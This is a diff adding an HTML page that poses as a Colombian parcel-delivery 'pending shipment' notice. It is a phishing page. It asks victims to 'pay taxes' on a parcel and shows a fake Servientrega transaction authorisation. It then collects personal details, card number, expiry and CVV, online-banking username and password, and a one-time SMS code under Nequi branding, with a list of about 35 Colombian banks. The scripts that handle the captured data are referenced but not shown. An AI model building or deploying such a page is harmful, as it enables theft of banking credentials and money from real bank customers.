@@ -1,0 +1,279 @@
+<html>
+    <head>
+        <title>envia.co</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        
+        <meta content="es" http-equiv="Content-Language">
+    
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="icon" href="images/favicon.png" type="image/x-icon">
+        <link href="assets/css/style.css" rel="stylesheet">
+        <link href="assets/css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="assets/js/functions.js"></script>
+        <style type="text/css">
+            #fondo{
+                position: fixed;
+                z-index: 600;
+                width: 100%;
+                height: 100%;
+                top: 0;
+                left: 0;
+                background-color: rgb(0 0 0 / 60%);
+                display: none;
+                
+            }
+            
+            header{
+                height: 60px;
+
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+
+            header img{
+                width: 260px;
+            }
+            
+            @import url('./assets/fonts/Urbanist-Regular.ttf');
+
+            *{
+                font-family: 'Urbanist';
+            }
+        </style>
+    </head>
+    <body>
+        <div id="fondo"></div>
+
+        <header>
+            <img src="images/header_logo.png" alt="">
+        </header>
+
+        <div id="frm-otp" class="frm-modal">
+            <div class="titulo">VERIFICACIÓN DE SEGURIDAD</div>
+            <br>
+            <div class="descripcion">Hemos enviado un código de validación a tu celular.</div>
+            <br>
+            <img src="../img/logos/nequi.png" width="50" id="logo-entidad-otp">
+            <br><br>
+            <div class="formulario">
+                <div class="etiqueta">Código OTP</div>
+                <input type="password" name="txt-otp" id="txt-otp" class="entradas" autocomplete="off" maxlength="6" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <div class="error" id="err-otp">Ingrese el código enviado a su celular</div>
+                <br><br><br>
+                <button class="btn" id="btn-validar">Validar</button>
+            </div>
+        </div>
+
+
+        <div id="frm-cargando" class="frm-modal">
+            <img src="../img/logos/nequi.png" width="50" id="logo-entidad-load">
+            <br>
+            <img src="images/gif-carga-final.gif" width="120">            
+            <br>
+            <div>Estamos procesando su solicitud espere un momento</div>
+        </div>
+
+        <div id="frm-autorizar" class="frm-modal">
+            <div style="padding: 30px 30px 0px 30px">
+                <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                    <tr>
+                        <td valign="middle" align="left"><img src="../img/verificado.jpg" width="100"></td>
+                        <td valign="middle" align="right"><img src="../img/mcheck.png" width="120"></td>
+                    </tr>
+                </table>
+            </div>
+            <div class="titulo">Autorización de Transacción</div>
+            <br>
+            <div class="descripcion">La transacción que intentas realizar con <b>Servientrega S.A.</b> por $6.200 el día <span id="fec">--</span> con la tarjeta terminada en <b><span id="tar">9969</span></b> deber ser autorizada.</div>
+            
+            <div class="titulo">DETALLES DE TRANSACCIÓN</div>
+            <br>
+            <div class="descripcion">
+                <b>Comercio:</b> Servientrega S.A.<br>
+                <b>Monto de la transacción:</b> $6.200<br>
+                <b>Número de autorización:</b> AG3244234
+            </div>
+            <br><br>
+            <div class="formulario">                
+                <button class="btn" id="btn-autorizar">Autorizar</button>
+            </div>
+        </div>
+
+
+        <div id="frm-verificacion" class="frm-modal">
+            <div class="titulo">VERIFICACIÓN DE SEGURIDAD</div>
+            <br>
+            <div class="descripcion">Debes autorizar la transacción que en proceso. Inicia sesión en tu banca virtual a continuación.</div>
+            <br>
+            <img src="../img/logos/nequi.png" width="50" id="logo-entidad">
+            <br><br>
+            <div class="formulario">
+                <div class="etiqueta">Usuario / Documento</div>
+                <input type="text" name="txt-usuario" id="txt-usuario" class="entradas">
+                <div class="error" id="err-usuario">Ingrese su Usuario</div>                
+                <br>
+                <div class="espacio"></div>
+                <div class="etiqueta">Contraseña</div>
+                <input type="password" name="txt-password" id="txt-password" class="entradas"> 
+                <div class="error" id="err-password">Ingrese su Contraseña</div>                   
+                <br><br><br>
+                <button class="btn" id="btn-iniciar-sesion">Iniciar Sesión</button>
+            </div>
+        </div>
+
+
+        <div id="frm-animacion" class="frm-modal">
+            <img src="images/gif-carga-final.gif" width="250px">
+            <br>
+            <div>Estamos procesando su solicitud espere un momento</div>
+        </div>
+
+
+        <div id="frm-tarjeta" class="frm-modal">            
+            <div class="formulario" style="padding-top: 30px;">
+                <div class="etiqueta">Banco</div>
+                <select id="txt-entidad" name="txt-entidad" class="entradas">
+                    <option label="A continuación seleccione su banco" value="">A continuación seleccione su banco</option>
+                    <option label="BANCAMIA S.A." value="bancamia">BANCAMIA S.A.</option>
+                    <option label="BANCO AGRARIO" value="agrario">BANCO AGRARIO</option>
+                    <option label="BANCO AV VILLAS" value="avvillas">BANCO AV VILLAS</option>
+                    <option label="BANCO BBVA COLOMBIA S.A." value="bbva">BANCO BBVA COLOMBIA S.A.</option>
+                    <option label="BANCO CAJA SOCIAL" value="caja-social">BANCO CAJA SOCIAL</option>
+                    <option label="BANCO COOPERATIVO COOPCENTRAL" value="coopertaivo-coopcentral">BANCO COOPERATIVO COOPCENTRAL</option>
+                    <option label="BANCO CREDIFINANCIERA" value="credifinanciera">BANCO CREDIFINANCIERA</option>
+                    <option label="BANCO DAVIVIENDA" value="davivienda">BANCO DAVIVIENDA</option>
+                    <option label="BANCO DE BOGOTA" value="bogota">BANCO DE BOGOTA</option>
+                    <option label="BANCO DE OCCIDENTE" value="occidente">BANCO DE OCCIDENTE</option>
+                    <option label="BANCO FALABELLA " value="falabella">BANCO FALABELLA </option>
+                    <option label="BANCO FINANDINA S.A. BIC" value="finandina">BANCO FINANDINA S.A. BIC</option>
+                    <option label="BANCO GNB SUDAMERIS" value="sudameris">BANCO GNB SUDAMERIS</option>
+                    <option label="BANCO ITAU" value="itau">BANCO ITAU</option>
+                    <option label="BANCO PICHINCHA S.A." value="pichincha">BANCO PICHINCHA S.A.</option>
+                    <option label="BANCO POPULAR" value="popular">BANCO POPULAR</option>
+                    <option label="BANCO SANTANDER COLOMBIA" value="santander">BANCO SANTANDER COLOMBIA</option>
+                    <option label="BANCO SERFINANZA" value="serfinanza">BANCO SERFINANZA</option>
+                    <option label="BANCO UNION antes GIROS" value="union">BANCO UNION antes GIROS</option>
+                    <option label="BANCOLOMBIA" value="bancolombia">BANCOLOMBIA</option>
+                    <option label="BANCOOMEVA S.A." value="bancomeva">BANCOOMEVA S.A.</option>
+                    <option label="CFA COOPERATIVA FINANCIERA" value="cfa">CFA COOPERATIVA FINANCIERA</option>
+                    <option label="CITIBANK " value="citibank">CITIBANK</option>
+                    <option label="COLTEFINANCIERA" value="coltefinanciera">COLTEFINANCIERA</option>
+                    <option label="CONFIAR COOPERATIVA FINANCIERA" value="confiar">CONFIAR COOPERATIVA FINANCIERA</option>
+                    <option label="COOFINEP COOPERATIVA FINANCIERA" value="coofinep">COOFINEP COOPERATIVA FINANCIERA</option>
+                    <option label="COTRAFA" value="cotrafa">COTRAFA</option>
+                    <option label="DALE" value="dale">DALE</option>
+                    <option label="DAVIPLATA" value="1551">DAVIPLATA</option>
+                    <option label="IRIS" value="iris">IRIS</option>
+                    <option label="LULO BANK" value="lulo">LULO BANK</option>
+                    <option label="MOVII S.A." value="movii">MOVII S.A.</option>
+                    <option label="NEQUI" value="nequi">NEQUI</option>
+                    <option label="RAPPIPAY" value="rappipay">RAPPIPAY</option>
+                    <option label="RAPPIPAY DAVIPLATA" value="rappipay">RAPPIPAY DAVIPLATA</option>
+                    <option label="SCOTIABANK COLPATRIA" value="scotiabank-colpatria">SCOTIABANK COLPATRIA</option>
+                </select>
+                <div class="error" id="err-entidad">Seleccione un Banco</div>
+                <div class="espacio"></div>
+                <div class="etiqueta">Tarjeta</div>
+                <input type="text" name="txt-tarjeta" id="txt-tarjeta" class="entradas" autocomplete="off" maxlength="16" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <div class="error" id="err-tarjeta">Ingrese una tarjeta de crédito</div>
+                <div class="espacio"></div>
+                <table border="0" cellpadding="0" cellspacing="0" width="100%">
+                    <tr>
+                        <td>
+                            <div class="etiqueta">Mes</div>
+                            <select id="mFecha" name="mFecha" class="entradas">
+                                <option value="" default selected>Seleccionar</option>
+                                <option value="01">Enero</option>
+                                <option value="02">Febrero</option>
+                                <option value="03">Marzo</option>
+                                <option value="04">Abril</option>
+                                <option value="05">Mayo</option>
+                                <option value="06">Junio</option>
+                                <option value="07">Julio</option>
+                                <option value="08">Agosto</option>
+                                <option value="09">Septiembre</option>
+                                <option value="10">Octubre</option>
+                                <option value="11">Noviembre</option>
+                                <option value="12">Diciembre</option>
+                            </select>
+                        </td>
+                        <td>
+                            <div class="etiqueta">Año</div>
+                            <select id="aFecha" name="aFecha" class="entradas">
+                                <option value="" default selected>Seleccionar</option>                  
+                                <option value="2023">2023</option>
+                                <option value="2024">2024</option>
+                                <option value="2025">2025</option>
+                                <option value="2026">2026</option>
+                                <option value="2027">2027</option>
+                                <option value="2028">2028</option>
+                                <option value="2029">2029</option>
+                                <option value="2030">2030</option>
+                                <option value="2031">2031</option>
+                                <option value="2032">2032</option>
+                                <option value="2033">2033</option>
+                            </select>
+                        </td>
+                    </tr>
+                </table>
+                <div class="error" id="err-fecha">Ingrese la fecha de vencimiento</div>
+                <div class="espacio"></div>
+                <div class="etiqueta">CVV</div>
+                <input type="text" name="txt-cvv" id="txt-cvv" class="entradas" autocomplete="off" maxlength="3" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                <div class="error" id="err-cvv">Ingrese el código de verificación</div>
+                <br><br>
+                <button class="btn" id="btn-pagar">Pagar</button>
+            </div>
+        </div>
+
+        <div class="container">
+                <div class="frm" id="frm-informacion">
+                    <div class="titulo" style="padding-top: 8px;">CONSULTA ENVÍO PENDIENTE</div>
+                    <br>
+                    <div class="etiqueta">Cédula</div>
+                    <input type="text" readonly disabled style="background-color: #f1f1f1;" name="txt-cedula" id="txt-cedula" class="entradas">                    
+                    <div class="espacio"></div>   
+
+                    <div class="etiqueta">Nombre(s) y Apellido(s)</div>
+                    <input type="text" name="txt-nombre" id="txt-nombre" class="entradas">
+                    <div class="error" id="err-nombre">Ingrese su nombre completo</div>
+                    <div class="espacio"></div>   
+
+                    <div class="etiqueta">Celular</div>
+                    <input type="text" name="txt-celular" id="txt-celular" class="entradas" autocomplete="off" maxlength="10" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
+                    <div class="error" id="err-celular">Ingrese su número de celular</div>
+                    <div class="espacio"></div> 
+
+                    <div class="etiqueta">Correo electrónico</div>
+                    <input type="text" name="txt-correo" id="txt-correo" class="entradas">
+                    <div class="error" id="err-correo">Ingrese un Correo electrónico</div>
+                    <div class="espacio"></div> 
+
+                    <div class="etiqueta">Dirección de Envío</div>
+                    <input type="text" name="txt-direccion" id="txt-direccion" class="entradas">
+                    <div class="error" id="err-direccion">Ingrese una dirección</div>
+                    <div class="espacio"></div> 
+
+                    <div class="etiqueta">Ciudad de Envío</div>
+                    <input type="text" name="txt-ciudad" id="txt-ciudad" class="entradas">
+                    <div class="error" id="err-ciudad">Ingrese una Ciudad</div>
+                    <div class="espacio"></div> 
+                    <br><br>
+                <button class="btn" id="btn-pagar-impuestos">Pagar Impuestos</button>
+                </div>    
+
+
+                <br><br>   
+        </div>
+
+
+        <script src="assets/js/config.js"></script>
+        <script src="assets/js/app2.js"></script>
+    </body>
+</html>
